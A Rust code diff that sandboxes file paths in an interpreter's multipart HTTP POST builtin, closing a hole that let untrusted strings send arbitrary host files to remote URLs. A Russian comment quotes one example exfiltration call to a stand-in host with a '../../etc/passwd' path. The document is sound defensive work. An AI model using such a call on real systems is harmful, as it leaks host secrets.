@@ -6,7 +6,7 @@ use std::io::Write;
 use std::net::ToSocketAddrs;
 
 use super::core::*;
-use super::io::SandboxMode;
+use super::io::{sandbox_path_ex, sandbox_violation, SandboxMode};
 use super::string::escape_html_chars;
 
 // ── Наряд №115: global template registry (Path B — parity TW/VM) ──
@@ -841,6 +841,33 @@ pub(crate) fn builtin_http_post_multipart(args: &[Value]) -> Result<Value, Strin
         }
     };
 
+    // ── Наряд №260: файловые поля — через песочницу ─────────────────────
+    // Раньше каждое файловое поле читалось `std::fs::read(path)` по СЫРОМУ
+    // пути из аргумента программы — единственное файловое чтение билтинов
+    // вне песочницы (read_file/delete_file/http_download — все за ней).
+    // Любой роут/шаблон, куда попадает недоверенная строка, мог отправить
+    // произвольный файл хоста на URL из программы — примитив эксфильтрации:
+    //   http_post_multipart("https://evil.example", {}, {"f": "../../etc/passwd"})
+    // Каждый путь прогоняется через SSOT песочницы ДО построения клиента и
+    // запроса; нарушение — ГРОМКАЯ ошибка со стабильным кодом
+    // [SANDBOX_VIOLATION] (лекало write_file, №252/№254). Относительные
+    // пути внутри песочницы работают как раньше — легитимный кейс
+    // «отправить файл, созданный программой» не сломан. Читается
+    // канонический путь (№252: путь, безопасный к использованию).
+    let mut file_parts: Vec<(String, std::path::PathBuf, String)> = Vec::new();
+    for (key, val) in &files {
+        if let Value::String(path) = val {
+            let safe_path = sandbox_path_ex(path, SandboxMode::ForRead)
+                .map_err(|e| format!("http_post_multipart(): {}", sandbox_violation(e)))?;
+            let file_name = std::path::Path::new(path)
+                .file_name()
+                .and_then(|n| n.to_str())
+                .unwrap_or("file")
+                .to_string();
+            file_parts.push((key.clone(), safe_path, file_name));
+        }
+    }
+
     let client = apply_ssrf_resolves(
         reqwest::blocking::Client::builder().timeout(std::time::Duration::from_secs(120)),
         &url,
@@ -857,20 +884,18 @@ pub(crate) fn builtin_http_post_multipart(args: &[Value]) -> Result<Value, Strin
         }
     }
 
-    // Add file fields
-    for (key, val) in &files {
-        if let Value::String(path) = val {
-            let file_bytes = std::fs::read(path).map_err(|e| {
-                format!("http_post_multipart(): cannot read file '{}': {}", path, e)
-            })?;
-            let file_name = std::path::Path::new(path)
-                .file_name()
-                .and_then(|n| n.to_str())
-                .unwrap_or("file");
-            let part = reqwest::blocking::multipart::Part::bytes(file_bytes)
-                .file_name(file_name.to_string());
-            form = form.part(key.clone(), part);
-        }
+    // Add file fields (paths pre-validated by the sandbox — see above)
+    for (key, safe_path, file_name) in &file_parts {
+        let file_bytes = std::fs::read(safe_path).map_err(|e| {
+            format!(
+                "http_post_multipart(): cannot read file '{}': {}",
+                safe_path.display(),
+                e
+            )
+        })?;
+        let part =
+            reqwest::blocking::multipart::Part::bytes(file_bytes).file_name(file_name.clone());
+        form = form.part(key.clone(), part);
     }
 
     let resp = client
